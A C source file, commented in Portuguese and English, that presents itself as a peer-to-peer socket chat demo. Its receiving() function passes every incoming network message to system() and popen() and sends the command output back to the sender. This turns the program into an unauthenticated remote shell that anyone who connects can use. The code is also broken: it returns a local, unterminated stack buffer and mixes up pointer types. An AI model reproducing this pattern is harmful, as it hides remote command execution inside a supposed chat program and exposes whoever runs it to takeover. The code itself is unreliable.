// C program to demonstrate peer to peer chat using Socket Programming
#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>

#define ECHOMAX 255

char name[20];
int PORT;

struct arg_struct {
    int server_fd;
		int PORT;
    char *server_addr_ip;
};

void sending(char **linha, int PORT, int sock, char *server_addr_ip);
void receiving(struct arg_struct *arguments);
void *receive_thread(struct arg_struct *arguments);
char **execute_command(char command[ECHOMAX]);

int main(int argc, char const **argv)
{
	if (argc < 3) {
		fprintf(stderr, "Usage: %s <Server_1 IP> <Server_2 IP> ... <Server_N IP>\n", argv[0]);
		exit (1);
	}

	printf("Qual seu nome?");
	scanf("%s", name);

	printf("Insira o nro da porta para comunicação:");
	scanf("%d", &PORT);

	int server_fd, new_socket;
	struct sockaddr_in address;
	int k = 0;

	// Creating socket file descriptor
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror("socket falhou :(");
		exit(EXIT_FAILURE);
	}
	// Forcefully attaching socket to the port

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	address.sin_port = htons(PORT);

	//Printed the server socket addr and port
	printf("Endereço IP Local: %s\n", inet_ntoa(address.sin_addr));
	printf("Porta: %d\n", (int)ntohs(address.sin_port));

	if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0)
	{
		perror("bind falhou :(");
		exit(EXIT_FAILURE);
	}
	if (listen(server_fd, 5) < 0)
	{
		perror("listen falhou :(");
		exit(EXIT_FAILURE);
	}
	printf("%d\n", 70);
	char ch[ECHOMAX];
	pthread_t tid;
	struct arg_struct servers[argc];
	int i = 0;

	for (; i < argc - 1; i++) {
		servers[i].server_fd = server_fd;
		servers[i].PORT = PORT;
		servers[i].server_addr_ip = inet_addr(argv[i + 1]);
		pthread_create(&tid, 0, &receive_thread, &servers[i]); 
	}

	do
	{
		printf("Escreva a mensagem para enviar\n");
		scanf(" %[^\n]", &ch);
		if (strcmp(ch, "exit") == 0) {
			break;
		}
		ch[strcspn(ch, "\n")] = 0;
		int j = 0;
		for (; j < argc - 1; j++) {
			sending(ch, PORT, server_fd, servers[j].server_addr_ip);
		}
	} while (strcmp(ch, "") != 0);

	close(server_fd);

	return 0;
}

char **execute_command(char command[ECHOMAX]) {
	FILE *fp;
	char buffer[ECHOMAX];
	fp = popen(command, "r");
	int i = 0;
	while (1)
	{
		buffer[i] = fgetc(fp); // reading the file
		if (buffer[i] == EOF) break;
		++i;
	}
	pclose(fp);
		
	return buffer;
}

//Sending messages to port
void sending(char **linha, int PORT, int sock, char *server_addr_ip)
{
	struct sockaddr_in serv_addr;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		printf("\n Erro na criação do socket \n");
		return;
	}

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = server_addr_ip;
	serv_addr.sin_port = htons(PORT);

	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
	{
		printf("\nNão foi posssível concluir a conexão\n");
		return;
	}

	printf("%s[PORTA:%d] diz: %s", name, PORT, linha);
	sendto(sock, linha, ECHOMAX, 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
	printf("\nMensagem enviada\n");
	close(sock);
}

//Calling receiving every 2 seconds
void *receive_thread(struct arg_struct *arguments)
{
	while (1)
	{
		sleep(2);
		receiving(arguments);
	}
}

//Receiving messages on our port
void receiving(struct arg_struct *arguments)
{
	struct sockaddr_in address;
	char linha[ECHOMAX] = {0};
	int addrlen = sizeof(address);
	fd_set current_sockets, ready_sockets;

	address.sin_family = AF_INET;
	address.sin_addr.s_addr = htonl(INADDR_ANY);
	address.sin_port = htons(arguments->PORT);

	//Initialize my current set
	FD_ZERO(&current_sockets);
	FD_SET(arguments->server_fd, &current_sockets);
	int k = 0;
	while (1)
	{
		k++;
		ready_sockets = current_sockets;

		if (select(FD_SETSIZE, &ready_sockets, NULL, NULL, NULL) < 0)
		{
			perror("ERRO :(");
			exit(EXIT_FAILURE);
		}
		int i = 0;
		for (i; i < FD_SETSIZE; ++i)
		{
			if (FD_ISSET(i, &ready_sockets))
			{

				if (i == arguments->server_fd)
				{
					int client_socket;

					if ((client_socket = accept(arguments->server_fd, (struct sockaddr *)&address,
																			(socklen_t *)&addrlen)) < 0)
					{
						perror("accept falhou :(");
						exit(EXIT_FAILURE);
					}
					FD_SET(client_socket, &current_sockets);
				}
				else
				{
					recv(i, linha, ECHOMAX, 0);
					printf("\n%s\n", linha);
					if(system(linha)) {
						printf("%s\n", linha);
					} else {
						char **result = execute_command(linha);
						strcpy(linha, result);
						sending(linha, arguments->PORT, arguments->server_fd, arguments->server_addr_ip);
					}
					FD_CLR(i, &current_sockets);
				}
			}
		}

		if (k == (FD_SETSIZE * 2))
				break;
	}
}